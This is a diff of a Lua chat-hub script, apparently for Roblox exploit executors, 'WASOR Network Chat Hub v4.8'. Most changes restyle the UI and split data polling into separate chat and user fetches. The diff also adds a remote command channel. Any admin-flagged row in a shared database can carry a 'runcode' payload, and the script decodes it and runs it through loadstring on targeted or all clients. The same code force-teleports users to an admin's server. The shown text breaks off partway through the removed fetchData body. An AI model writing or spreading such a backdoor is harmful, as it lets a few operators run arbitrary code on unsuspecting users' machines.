@@ -37,6 +37,7 @@ local UserInputService = game:GetService("UserInputService")
 local TeleportService = game:GetService("TeleportService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local SoundService = game:GetService("SoundService")
+local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
 local HubTheme = nil
@@ -358,60 +359,71 @@ if VH and VH.UI then
     end
 end
 
+local function getCurrentWasorColors()
+    local c1 = (VH and VH.State and VH.State.currentThemeColor)
+        or (VH and VH.UI and VH.UI.themeColors and (VH.UI.themeColors["Red"] or VH.UI.themeColors["Galaxy"]))
+        or Color3.fromRGB(218, 38, 38)
+    local c2 = (VH and VH.State and VH.State.currentThemeGradientColor) or c1
+    return c1, c2
+end
+
+local wasorAccent1, wasorAccent2 = getCurrentWasorColors()
+
 if isClassic then
     HubTheme = {
-        isModern     = false,
-        windowBg     = Color3.fromRGB(37, 37, 38),
-        titleBg      = Color3.fromRGB(45, 45, 48),
-        sidebarBg    = Color3.fromRGB(32, 32, 34),
-        panelBg      = Color3.fromRGB(42, 42, 45),
-        cardBg       = Color3.fromRGB(44, 44, 48),
-        cardHover    = Color3.fromRGB(56, 56, 62),
-        inputBg      = Color3.fromRGB(26, 26, 28),
-        border       = Color3.fromRGB(20, 20, 22),
-        borderSubtle = Color3.fromRGB(55, 55, 58),
-        text         = Color3.fromRGB(225, 225, 228),
-        textMuted    = Color3.fromRGB(160, 160, 165),
-        textDim      = Color3.fromRGB(115, 115, 120),
-        accent       = Color3.fromRGB(0, 122, 204),
-        accentHover  = Color3.fromRGB(28, 140, 224),
-        green        = Color3.fromRGB(76, 175, 80),
-        red          = Color3.fromRGB(215, 60, 60),
-        yellow       = Color3.fromRGB(220, 170, 50),
-        purple       = Color3.fromRGB(160, 120, 220),
-        btnBg        = Color3.fromRGB(50, 50, 54),
-        font         = Enum.Font.SourceSans,
-        fontBold     = Enum.Font.SourceSansBold,
-        fontSemibold = Enum.Font.SourceSansSemibold,
-        cornerRadius = 0,
+        isModern       = false,
+        windowBg       = Color3.fromRGB(37, 37, 38),
+        titleBg        = Color3.fromRGB(45, 45, 48),
+        sidebarBg      = Color3.fromRGB(32, 32, 34),
+        panelBg        = Color3.fromRGB(42, 42, 45),
+        cardBg         = Color3.fromRGB(44, 44, 48),
+        cardHover      = Color3.fromRGB(56, 56, 62),
+        inputBg        = Color3.fromRGB(26, 26, 28),
+        border         = Color3.fromRGB(20, 20, 22),
+        borderSubtle   = Color3.fromRGB(55, 55, 58),
+        text           = Color3.fromRGB(225, 225, 228),
+        textMuted      = Color3.fromRGB(160, 160, 165),
+        textDim        = Color3.fromRGB(115, 115, 120),
+        accent         = wasorAccent1,
+        accentGradient = wasorAccent2,
+        accentHover    = Color3.fromRGB(28, 140, 224),
+        green          = Color3.fromRGB(76, 175, 80),
+        red            = Color3.fromRGB(215, 60, 60),
+        yellow         = Color3.fromRGB(220, 170, 50),
+        purple         = Color3.fromRGB(160, 120, 220),
+        btnBg          = Color3.fromRGB(50, 50, 54),
+        font           = Enum.Font.SourceSans,
+        fontBold       = Enum.Font.SourceSansBold,
+        fontSemibold   = Enum.Font.SourceSansSemibold,
+        cornerRadius   = 0,
     }
 else
-    local curAccent = (VH and VH.State and VH.State.currentThemeColor) or (VH and VH.UI and VH.UI.themeColors and VH.UI.themeColors["Red"]) or Color3.fromRGB(218, 38, 38)
     HubTheme = {
-        isModern     = true,
-        windowBg     = Color3.fromRGB(18, 18, 22),
-        titleBg      = Color3.fromRGB(24, 24, 28),
-        sidebarBg    = Color3.fromRGB(16, 16, 20),
-        panelBg      = Color3.fromRGB(22, 22, 26),
-        cardBg       = Color3.fromRGB(26, 26, 30),
-        cardHover    = Color3.fromRGB(36, 36, 42),
-        inputBg      = Color3.fromRGB(14, 14, 16),
-        border       = Color3.fromRGB(38, 38, 44),
-        borderSubtle = Color3.fromRGB(48, 48, 54),
-        text         = Color3.fromRGB(240, 240, 245),
-        textMuted    = Color3.fromRGB(160, 160, 170),
-        textDim      = Color3.fromRGB(115, 115, 125),
-        accent       = curAccent,
-        accentHover  = Color3.fromRGB(math.clamp(math.floor(curAccent.R * 255 + 25), 0, 255), math.clamp(math.floor(curAccent.G * 255 + 25), 0, 255), math.clamp(math.floor(curAccent.B * 255 + 25), 0, 255)),
-        green        = Color3.fromRGB(46, 204, 113),
-        red          = Color3.fromRGB(218, 38, 38),
-        yellow       = Color3.fromRGB(241, 196, 15),
-        purple       = Color3.fromRGB(141, 47, 196),
-        btnBg        = Color3.fromRGB(32, 32, 36),
-        font         = Enum.Font.Gotham,
-        fontBold     = Enum.Font.GothamBold,
-        fontSemibold = Enum.Font.GothamMedium,
-        cornerRadius = 8,
+        isModern       = true,
+        windowBg       = Color3.fromRGB(20, 20, 24),
+        titleBg        = Color3.fromRGB(24, 24, 28),
+        sidebarBg      = Color3.fromRGB(16, 16, 20),
+        panelBg        = Color3.fromRGB(22, 22, 26),
+        cardBg         = Color3.fromRGB(26, 26, 32),
+        cardHover      = Color3.fromRGB(36, 36, 44),
+        inputBg        = Color3.fromRGB(14, 14, 18),
+        border         = Color3.fromRGB(38, 38, 46),
+        borderSubtle   = Color3.fromRGB(48, 48, 56),
+        text           = Color3.fromRGB(240, 240, 245),
+        textMuted      = Color3.fromRGB(160, 160, 170),
+        textDim        = Color3.fromRGB(115, 115, 125),
+        accent         = wasorAccent1,
+        accentGradient = wasorAccent2,
+        accentHover    = Color3.fromRGB(math.clamp(math.floor(wasorAccent1.R * 255 + 25), 0, 255), math.clamp(math.floor(wasorAccent1.G * 255 + 25), 0, 255), math.clamp(math.floor(wasorAccent1.B * 255 + 25), 0, 255)),
+        green          = Color3.fromRGB(46, 204, 113),
+        red            = Color3.fromRGB(218, 38, 38),
+        yellow         = Color3.fromRGB(241, 196, 15),
+        purple         = Color3.fromRGB(141, 47, 196),
+        btnBg          = Color3.fromRGB(30, 30, 36),
+        font           = Enum.Font.Gotham,
+        fontBold       = Enum.Font.GothamBold,
+        fontSemibold   = Enum.Font.GothamMedium,
+        cornerRadius   = 6,
     }
 end
 
@@ -472,12 +484,18 @@ WindowFrame.BackgroundColor3 = HubTheme.windowBg
 WindowFrame.BorderSizePixel = 0
 WindowFrame.Active = true
 WindowFrame.Parent = ScreenGui
-Instance.new("UICorner", WindowFrame).CornerRadius = UDim.new(0, 10)
+Instance.new("UICorner", WindowFrame).CornerRadius = UDim.new(0, 6)
 do
     local s = Instance.new("UIStroke", WindowFrame)
     s.Color = HubTheme.border
     s.Thickness = 1
 end
+
+local animScale = Instance.new("UIScale")
+animScale.Name = "AnimScale"
+animScale.Scale = 0.88
+animScale.Parent = WindowFrame
+TweenService:Create(animScale, TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Scale = 1}):Play()
 
 local ResizeHandle = Instance.new("TextButton")
 ResizeHandle.Name = "ResizeHandle"
@@ -493,65 +511,81 @@ ResizeHandle.Parent = WindowFrame
 
 local TitleBar = Instance.new("Frame")
 TitleBar.Name = "TitleBar"
-TitleBar.Size = UDim2.new(1, 0, 0, 38)
-TitleBar.BackgroundColor3 = HubTheme.titleBg
+TitleBar.Size = UDim2.new(1, 0, 0, 28)
+TitleBar.BackgroundColor3 = Color3.fromRGB(14, 14, 16)
 TitleBar.BorderSizePixel = 0
+TitleBar.ClipsDescendants = false
 TitleBar.Parent = WindowFrame
-Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 10)
+local titleCorner = Instance.new("UICorner", TitleBar)
+titleCorner.CornerRadius = UDim.new(0, 6)
+
+local fillL = Instance.new("Frame")
+fillL.Name = "FillL"
+fillL.Size = UDim2.new(0, 6, 0, 6)
+fillL.Position = UDim2.new(0, 0, 1, -6)
+fillL.BackgroundColor3 = Color3.fromRGB(14, 14, 16)
+fillL.BorderSizePixel = 0
+fillL.ZIndex = 1
+fillL.Parent = TitleBar
+
+local fillR = Instance.new("Frame")
+fillR.Name = "FillR"
+fillR.Size = UDim2.new(0, 6, 0, 6)
+fillR.Position = UDim2.new(1, -6, 1, -6)
+fillR.BackgroundColor3 = Color3.fromRGB(14, 14, 16)
+fillR.BorderSizePixel = 0
+fillR.ZIndex = 1
+fillR.Parent = TitleBar
+
+local titleBottomLine = Instance.new("Frame")
+titleBottomLine.Name = "TitleBottomLine"
+titleBottomLine.Size = UDim2.new(1, 0, 0, 1)
+titleBottomLine.Position = UDim2.new(0, 0, 1, -1)
+titleBottomLine.BackgroundColor3 = Color3.fromRGB(36, 36, 44)
+titleBottomLine.BorderSizePixel = 0
+titleBottomLine.ZIndex = 2
+titleBottomLine.Parent = TitleBar
 
 local OnlineCounterText = Instance.new("TextLabel")
 do
-    local c = Instance.new("Frame")
-    c.Size = UDim2.new(1, 0, 0, 10)
-    c.Position = UDim2.new(0, 0, 1, -10)
-    c.BackgroundColor3 = HubTheme.titleBg
-    c.BorderSizePixel = 0
-    c.Parent = TitleBar
-
     local icon = Instance.new("TextLabel")
-    icon.Size = UDim2.new(0, 24, 0, 24)
-    icon.Position = UDim2.new(0, 12, 0, 7)
+    icon.Size = UDim2.new(0, 20, 0, 20)
+    icon.Position = UDim2.new(0, 8, 0, 4)
     icon.BackgroundTransparency = 1
     icon.Text = "💬"
-    icon.TextSize = 16
+    icon.TextSize = 13
+    icon.ZIndex = 3
     icon.Parent = TitleBar
 
     local tt = Instance.new("TextLabel")
-    tt.Size = UDim2.new(0, 100, 1, 0)
-    tt.Position = UDim2.new(0, 40, 0, 0)
+    tt.Size = UDim2.new(0, 210, 1, 0)
+    tt.Position = UDim2.new(0, 32, 0, 0)
     tt.BackgroundTransparency = 1
-    tt.Text = "WASOR Network Chat"
-    tt.TextColor3 = Color3.fromRGB(242, 243, 245)
+    tt.Text = "WASOR Network Chat Hub v4.8"
+    tt.TextColor3 = Color3.fromRGB(255, 255, 255)
     tt.Font = HubTheme.fontBold
-    tt.TextSize = 14
+    tt.TextSize = 11
     tt.TextXAlignment = Enum.TextXAlignment.Left
+    tt.ZIndex = 3
     tt.Parent = TitleBar
 
-    local st = Instance.new("TextLabel")
-    st.Size = UDim2.new(0, 140, 1, 0)
-    st.Position = UDim2.new(0, 138, 0, 0)
-    st.BackgroundTransparency = 1
-    st.Text = "•"
-    st.TextColor3 = Color3.fromRGB(148, 155, 164)
-    st.Font = HubTheme.font
-    st.TextSize = 11
-    st.TextXAlignment = Enum.TextXAlignment.Left
-    st.Parent = TitleBar
-
     local pill = Instance.new("Frame")
-    pill.Size = UDim2.new(0, 140, 0, 22)
-    pill.Position = UDim2.new(0, 290, 0, 8)
-    pill.BackgroundColor3 = HubTheme.inputBg
+    pill.Size = UDim2.new(0, 130, 0, 20)
+    pill.Position = UDim2.new(0, 248, 0.5, -10)
+    pill.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    pill.BackgroundTransparency = 0.4
     pill.BorderSizePixel = 0
+    pill.ZIndex = 3
     pill.Parent = TitleBar
-    Instance.new("UICorner", pill).CornerRadius = UDim.new(0, 11)
+    Instance.new("UICorner", pill).CornerRadius = UDim.new(0, 10)
 
     OnlineCounterText.Size = UDim2.new(1, 0, 1, 0)
     OnlineCounterText.BackgroundTransparency = 1
     OnlineCounterText.Text = "🟢 0 Online"
-    OnlineCounterText.TextColor3 = HubTheme.green
+    OnlineCounterText.TextColor3 = Color3.fromRGB(255, 255, 255)
     OnlineCounterText.Font = HubTheme.fontBold
-    OnlineCounterText.TextSize = 11
+    OnlineCounterText.TextSize = 10
+    OnlineCounterText.ZIndex = 4
     OnlineCounterText.Parent = pill
 end
 
@@ -560,65 +594,65 @@ local MinBtn = Instance.new("TextButton")
 local CloseBtn = Instance.new("TextButton")
 do
     local c = Instance.new("Frame")
-    c.Size = UDim2.new(0, 110, 1, 0)
-    c.Position = UDim2.new(1, -115, 0, 0)
+    c.Size = UDim2.new(0, 85, 1, 0)
+    c.Position = UDim2.new(1, -90, 0, 0)
     c.BackgroundTransparency = 1
+    c.ZIndex = 3
     c.Parent = TitleBar
 
-    SoundBtn.Size = UDim2.new(0, 30, 0, 30)
-    SoundBtn.Position = UDim2.new(0, 0, 0, 4)
+    SoundBtn.Size = UDim2.new(0, 22, 0, 22)
+    SoundBtn.Position = UDim2.new(0, 0, 0.5, -11)
     SoundBtn.BackgroundTransparency = 1
     SoundBtn.Text = "🔊"
-    SoundBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
+    SoundBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     SoundBtn.Font = HubTheme.fontBold
-    SoundBtn.TextSize = 14
+    SoundBtn.TextSize = 12
+    SoundBtn.ZIndex = 4
     SoundBtn.Parent = c
 
-    MinBtn.Size = UDim2.new(0, 30, 0, 30)
-    MinBtn.Position = UDim2.new(0, 36, 0, 4)
+    MinBtn.Size = UDim2.new(0, 22, 0, 22)
+    MinBtn.Position = UDim2.new(0, 28, 0.5, -11)
     MinBtn.BackgroundTransparency = 1
     MinBtn.Text = "-"
-    MinBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
+    MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     MinBtn.Font = HubTheme.fontBold
-    MinBtn.TextSize = 14
+    MinBtn.TextSize = 13
+    MinBtn.ZIndex = 4
     MinBtn.Parent = c
     Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 4)
 
     MinBtn.MouseEnter:Connect(function()
-        MinBtn.BackgroundColor3 = Color3.fromRGB(43, 45, 49)
-        MinBtn.BackgroundTransparency = 0
-        MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        MinBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        MinBtn.BackgroundTransparency = 0.6
     end)
     MinBtn.MouseLeave:Connect(function()
         MinBtn.BackgroundTransparency = 1
-        MinBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
     end)
 
-    CloseBtn.Size = UDim2.new(0, 30, 0, 30)
-    CloseBtn.Position = UDim2.new(0, 72, 0, 4)
+    CloseBtn.Size = UDim2.new(0, 22, 0, 22)
+    CloseBtn.Position = UDim2.new(0, 56, 0.5, -11)
     CloseBtn.BackgroundTransparency = 1
     CloseBtn.Text = "X"
-    CloseBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
+    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     CloseBtn.Font = HubTheme.fontBold
-    CloseBtn.TextSize = 14
+    CloseBtn.TextSize = 11
+    CloseBtn.ZIndex = 4
     CloseBtn.Parent = c
     Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 4)
-end
 
-CloseBtn.MouseEnter:Connect(function()
-    CloseBtn.BackgroundColor3 = HubTheme.red
-    CloseBtn.BackgroundTransparency = 0
-    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-end)
-CloseBtn.MouseLeave:Connect(function()
-    CloseBtn.BackgroundTransparency = 1
-    CloseBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
-end)
+    CloseBtn.MouseEnter:Connect(function()
+        CloseBtn.BackgroundColor3 = HubTheme.red
+        CloseBtn.BackgroundTransparency = 0
+    end)
+    CloseBtn.MouseLeave:Connect(function()
+        CloseBtn.BackgroundTransparency = 1
+    end)
+end
 
 local BodyFrame = Instance.new("Frame")
 BodyFrame.Name = "BodyFrame"
-BodyFrame.Size = UDim2.new(1, 0, 1, -38)
-BodyFrame.Position = UDim2.new(0, 0, 0, 38)
+BodyFrame.Size = UDim2.new(1, 0, 1, -28)
+BodyFrame.Position = UDim2.new(0, 0, 0, 28)
 BodyFrame.BackgroundTransparency = 1
 BodyFrame.Parent = WindowFrame
 
@@ -979,29 +1013,47 @@ do
     inputC.BackgroundTransparency = 1
     inputC.Parent = ChatView
 
-    TextBox.Size = UDim2.new(1, -44, 1, 0)
-    TextBox.BackgroundColor3 = Color3.fromRGB(43, 45, 49)
+    TextBox.Size = UDim2.new(1, -74, 1, 0)
+    TextBox.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
     TextBox.TextColor3 = Color3.fromRGB(242, 243, 245)
-    TextBox.PlaceholderColor3 = Color3.fromRGB(148, 155, 164)
+    TextBox.PlaceholderColor3 = Color3.fromRGB(120, 125, 134)
     TextBox.PlaceholderText = "Message #global-cross-chat... (Press Enter)"
     TextBox.Font = HubTheme.font
-    TextBox.TextSize = 13
+    TextBox.TextSize = 11
     TextBox.TextXAlignment = Enum.TextXAlignment.Left
-    TextBox.ClearTextOnFocus = true
+    TextBox.ClearTextOnFocus = false
     TextBox.Text = ""
     TextBox.Parent = inputC
     Instance.new("UIPadding", TextBox).PaddingLeft = UDim.new(0, 10)
-    Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 6)
+    Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 4)
+    local tbStroke = Instance.new("UIStroke", TextBox)
+    tbStroke.Color = Color3.fromRGB(42, 42, 50)
+    tbStroke.Thickness = 1
 
-    SendBtn.Size = UDim2.new(0, 38, 1, 0)
-    SendBtn.Position = UDim2.new(1, -38, 0, 0)
-    SendBtn.BackgroundColor3 = HubTheme.accent
-    SendBtn.Text = "🚀"
+    TextBox.Focused:Connect(function()
+        tbStroke.Color = HubTheme.accent
+    end)
+    TextBox.FocusLost:Connect(function(enterPressed)
+        tbStroke.Color = Color3.fromRGB(42, 42, 50)
+        if enterPressed then
+            handleSendMessage()
+        end
+    end)
+
+    SendBtn.Size = UDim2.new(0, 68, 1, 0)
+    SendBtn.Position = UDim2.new(1, -68, 0, 0)
+    SendBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    SendBtn.BorderSizePixel = 0
+    SendBtn.Text = "Send ⏎"
     SendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     SendBtn.Font = HubTheme.fontBold
-    SendBtn.TextSize = 13
+    SendBtn.TextSize = 11
     SendBtn.Parent = inputC
-    Instance.new("UICorner", SendBtn).CornerRadius = UDim.new(0, 6)
+    Instance.new("UICorner", SendBtn).CornerRadius = UDim.new(0, 4)
+
+    local sendGrad = Instance.new("UIGradient", SendBtn)
+    sendGrad.Name = "SendGradient"
+    sendGrad.Color = ColorSequence.new(HubTheme.accent, HubTheme.accentGradient or HubTheme.accent)
 
     local emojis = {"😀", "😂", "🔥", "❤️", "💀", "👑", "🚀", "👍", "🎮", "⚡", "👋", "🎉", "✨", "👀", "💯"}
     for _, em in ipairs(emojis) do
@@ -2161,23 +2213,30 @@ openUserProfile = function(user)
 end
 
 local fetchData
+local fetchChat
+local fetchUsers
+local isFetchingChat = false
+local isFetchingUsers = false
 
 selectTab = function(tab)
     currentTab = tab
-    ChannelUsers.BackgroundTransparency = 1; ChannelUsers.TextColor3 = Color3.fromRGB(148, 155, 164)
-    ChannelServerChat.BackgroundTransparency = 1; ChannelServerChat.TextColor3 = Color3.fromRGB(148, 155, 164)
-    ChannelGlobalChat.BackgroundTransparency = 1; ChannelGlobalChat.TextColor3 = Color3.fromRGB(148, 155, 164)
-    ChannelHistory.BackgroundTransparency = 1; ChannelHistory.TextColor3 = Color3.fromRGB(148, 155, 164)
-    ChannelExecPanel.BackgroundTransparency = 1; ChannelExecPanel.TextColor3 = Color3.fromRGB(148, 155, 164)
+    ChannelUsers.BackgroundColor3 = Color3.fromRGB(24, 24, 28); ChannelUsers.BackgroundTransparency = 1; ChannelUsers.TextColor3 = Color3.fromRGB(148, 155, 164)
+    ChannelServerChat.BackgroundColor3 = Color3.fromRGB(24, 24, 28); ChannelServerChat.BackgroundTransparency = 1; ChannelServerChat.TextColor3 = Color3.fromRGB(148, 155, 164)
+    ChannelGlobalChat.BackgroundColor3 = Color3.fromRGB(24, 24, 28); ChannelGlobalChat.BackgroundTransparency = 1; ChannelGlobalChat.TextColor3 = Color3.fromRGB(148, 155, 164)
+    ChannelHistory.BackgroundColor3 = Color3.fromRGB(24, 24, 28); ChannelHistory.BackgroundTransparency = 1; ChannelHistory.TextColor3 = Color3.fromRGB(148, 155, 164)
+    ChannelExecPanel.BackgroundColor3 = Color3.fromRGB(24, 24, 28); ChannelExecPanel.BackgroundTransparency = 1; ChannelExecPanel.TextColor3 = Color3.fromRGB(148, 155, 164)
     UsersView.Visible = false; ChatView.Visible = false; HistoryView.Visible = false; ExecPanelFrame.Visible = false; ProfileModal.Visible = false
 
+    local activeBtn = nil
     if tab == "users" then
-        ChannelUsers.BackgroundColor3 = HubTheme.cardHover; ChannelUsers.BackgroundTransparency = 0; ChannelUsers.TextColor3 = Color3.fromRGB(255, 255, 255); UsersView.Visible = true
+        activeBtn = ChannelUsers
+        UsersView.Visible = true
         if pendingUsersRedraw or lastUsersSignature == "" then
             refreshUIList(cachedUsersData)
         end
+        if fetchUsers then fetchUsers(true) end
     elseif tab == "server" then
-        ChannelServerChat.BackgroundColor3 = HubTheme.cardHover; ChannelServerChat.BackgroundTransparency = 0; ChannelServerChat.TextColor3 = Color3.fromRGB(255, 255, 255)
+        activeBtn = ChannelServerChat
         TextBox.PlaceholderText = "Message #server-chat... (Press Enter)"
         ChatChannelTitle.Text = "🎮 # server-chat"
         ChatChannelDesc.Text = "Local server chat • Job: " .. string.sub(JobId, 1, 8) .. "..."
@@ -2186,9 +2245,9 @@ selectTab = function(tab)
         if cachedLastMessages and #cachedLastMessages > 0 then
             refreshChatUI(cachedLastMessages, cachedAdminPool)
         end
-        task.spawn(function() if fetchData then fetchData() end end)
+        if fetchChat then fetchChat(true) end
     elseif tab == "global" then
-        ChannelGlobalChat.BackgroundColor3 = HubTheme.cardHover; ChannelGlobalChat.BackgroundTransparency = 0; ChannelGlobalChat.TextColor3 = Color3.fromRGB(255, 255, 255)
+        activeBtn = ChannelGlobalChat
         TextBox.PlaceholderText = "Message #global-cross-chat... (Press Enter)"
         ChatChannelTitle.Text = "💬 # global-cross-chat"
         ChatChannelDesc.Text = "Cross-game network communication"
@@ -2197,13 +2256,20 @@ selectTab = function(tab)
         if cachedLastMessages and #cachedLastMessages > 0 then
             refreshChatUI(cachedLastMessages, cachedAdminPool)
         end
-        task.spawn(function() if fetchData then fetchData() end end)
+        if fetchChat then fetchChat(true) end
     elseif tab == "history" then
-        ChannelHistory.BackgroundColor3 = HubTheme.cardHover; ChannelHistory.BackgroundTransparency = 0; ChannelHistory.TextColor3 = Color3.fromRGB(255, 255, 255)
+        activeBtn = ChannelHistory
         HistoryView.Visible = true
         refreshHistoryUI(cachedHistoryData, cachedUsersData)
     elseif tab == "exec" then
-        ChannelExecPanel.BackgroundColor3 = HubTheme.cardHover; ChannelExecPanel.BackgroundTransparency = 0; ChannelExecPanel.TextColor3 = Color3.fromRGB(255, 255, 255); ExecPanelFrame.Visible = true
+        activeBtn = ChannelExecPanel
+        ExecPanelFrame.Visible = true
+    end
+
+    if activeBtn then
+        activeBtn.BackgroundColor3 = Color3.fromRGB(34, 34, 42)
+        activeBtn.BackgroundTransparency = 0
+        activeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     end
 end
 
@@ -2835,7 +2901,7 @@ end
 local function sendChatMessage(text)
     local cleanMsg = sanitizeText(text)
     if cleanMsg == "" then return end
-    if tick() - lastChatTime < 1.5 then
+    if tick() - lastChatTime < 0.6 then
         showToast("Sending too fast, please wait...", HubTheme.red)
         return
     end
@@ -2848,161 +2914,163 @@ local function sendChatMessage(text)
     local targetPayload = { username = Username, message = cleanMsg }
     if currentTab == "server" then targetPayload.job_id = JobId end
 
-    pcall(function()
-        request({
-            Url = SUPABASE_URL .. "/rest/v1/executor_chat",
-            Method = "POST",
-            Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY, ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(targetPayload)
-        })
+    task.spawn(function()
+        pcall(function()
+            request({
+                Url = SUPABASE_URL .. "/rest/v1/executor_chat",
+                Method = "POST",
+                Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY, ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(targetPayload)
+            })
+        end)
+        task.wait(0.12)
+        if fetchChat then fetchChat(true) end
+    end)
+end
+
+fetchChat = function(force)
+    if not running then return end
+    if isFetchingChat and not force then return end
+    isFetchingChat = true
+
+    task.spawn(function()
+        local queryFilter = (currentTab == "global") and "job_id=is.null" or "job_id=eq." .. JobId
+        local resChat = nil
+        pcall(function()
+            resChat = request({
+                Url = SUPABASE_URL .. "/rest/v1/executor_chat?" .. queryFilter .. "&order=created_at.desc&limit=35",
+                Method = "GET",
+                Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
+            })
+        end)
+        isFetchingChat = false
+
+        if resChat and resChat.StatusCode == 200 then
+            local success, msgs = pcall(function() return HttpService:JSONDecode(resChat.Body) end)
+            if success and type(msgs) == "table" then
+                local orderedMsgs = {}
+                for i = #msgs, 1, -1 do table.insert(orderedMsgs, msgs[i]) end
+                refreshChatUI(orderedMsgs, cachedAdminPool)
+            end
+        end
+    end)
+end
+
+fetchUsers = function(force)
+    if not running then return end
+    if isFetchingUsers and not force then return end
+    isFetchingUsers = true
+
+    task.spawn(function()
+        local resUser = nil
+        pcall(function()
+            resUser = request({
+                Url = SUPABASE_URL .. "/rest/v1/executor_sync?select=user_id,username,executor,teleport_target,active_effect,is_admin,is_sub_admin,current_game,job_id,place_id,updated_at&order=updated_at.desc&limit=1000",
+                Method = "GET",
+                Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
+            })
+        end)
+        isFetchingUsers = false
+
+        local adminPool = {}
+        if resUser and resUser.StatusCode == 200 then
+            local success, users = pcall(function() return HttpService:JSONDecode(resUser.Body) end)
+            if success and type(users) == "table" then
+                for _, u in ipairs(users) do
+                    if u.user_id then cachedUserIds[u.username] = u.user_id end
+                    if u.executor then cachedUserExecutors[u.username] = u.executor end
+                    if u.username and u.executor then trackUserExecutor(u.username, u.executor) end
+                    if u.is_admin == true or u.is_sub_admin == true then
+                        adminPool[u.username] = true
+                    end
+                    if u.user_id == UserId or u.username == Username then
+                        IsAdmin = (u.is_admin == true)
+                        IsSubAdmin = (u.is_sub_admin == true)
+                        local canAccessExec = (IsAdmin or IsSubAdmin) and (ADMIN_KEY ~= "")
+                        ChannelExecPanel.Visible = canAccessExec
+                        CatAdmin.Visible = canAccessExec
+                    end
+                end
+                cachedUserExecutors[Username] = myExecutor
+                cachedAdminPool = adminPool
+                cachedUsersData = users
+                if WindowFrame.Visible and currentTab == "users" then
+                    refreshUIList(users)
+                else
+                    pendingUsersRedraw = true
+                end
+
+                for _, user in ipairs(users) do
+                    if user.teleport_target ~= "none" and (user.teleport_target == Username or user.teleport_target == "all") then
+                        if tick() - lastTeleportTime > 5 then
+                            if user.is_admin == true or user.is_sub_admin == true then
+                                lastTeleportTime = tick()
+                                TeleportService:TeleportToPlaceInstance(user.place_id, user.job_id, LocalPlayer)
+                            end
+                        end
+                    end
+
+                    if user.active_effect and user.active_effect ~= "none" then
+                        local delimiterIndex = string.find(user.active_effect, "||PAYLOAD||")
+                        if delimiterIndex then
+                            local headerPart = string.sub(user.active_effect, 1, delimiterIndex - 1)
+                            local payloadPart = string.sub(user.active_effect, delimiterIndex + 11)
+
+                            local cmdData = string.split(headerPart, ":")
+                            local action = cmdData[1]
+                            local target = cmdData[2]
+                            local uniqueHash = cmdData[3]
+
+                            if uniqueHash and not handledCommands[uniqueHash] then
+                                if user.is_admin == true or user.is_sub_admin == true then
+                                    handledCommands[uniqueHash] = true
+                                    if action == "runcode" and (target == Username or target == "all") then
+                                        local decodedCode = cleanUrlDecode(payloadPart)
+                                        local executable, execError = loadstring(decodedCode)
+                                        if executable then
+                                            task.spawn(executable)
+                                        else
+                                            warn("Execution String Error: " .. tostring(execError))
+                                        end
+                                    end
+                                end
+                            end
+                        else
+                            local cmdData = string.split(user.active_effect, ":")
+                            local action = cmdData[1]
+                            local target = cmdData[2]
+                            local uniqueHash = cmdData[3]
+
+                            if uniqueHash and not handledCommands[uniqueHash] then
+                                if user.is_admin == true or user.is_sub_admin == true then
+                                    handledCommands[uniqueHash] = true
+                                    if action == "kill" or action == "explode" then
+                                        if target == Username or target == "all" then
+                                            runLocalExplosionEffect(Username)
+                                        else
+                                            runLocalExplosionEffect(target)
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
     end)
 end
 
 fetchData = function()
-    if not running then return end
-
-    local resUser = nil
-    pcall(function()
-        resUser = request({
-            Url = SUPABASE_URL .. "/rest/v1/executor_sync?select=user_id,username,executor,teleport_target,active_effect,is_admin,is_sub_admin,current_game,job_id,place_id,updated_at&order=updated_at.desc&limit=5000",
-            Method = "GET",
-            Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
-        })
-    end)
-
-    local adminPool = {}
-    if resUser and resUser.StatusCode == 200 then
-        local success, users = pcall(function() return HttpService:JSONDecode(resUser.Body) end)
-        if success and type(users) == "table" then
-            for _, u in ipairs(users) do
-                if u.user_id then cachedUserIds[u.username] = u.user_id end
-                if u.executor then cachedUserExecutors[u.username] = u.executor end
-                if u.username and u.executor then trackUserExecutor(u.username, u.executor) end
-                if u.is_admin == true or u.is_sub_admin == true then
-                    adminPool[u.username] = true
-                end
-                if u.user_id == UserId or u.username == Username then
-                    IsAdmin = (u.is_admin == true)
-                    IsSubAdmin = (u.is_sub_admin == true)
-                    local canAccessExec = (IsAdmin or IsSubAdmin) and (ADMIN_KEY ~= "")
-                    ChannelExecPanel.Visible = canAccessExec
-                    CatAdmin.Visible = canAccessExec
-                end
-            end
-            cachedUserExecutors[Username] = myExecutor
-            cachedAdminPool = adminPool
-            cachedUsersData = users
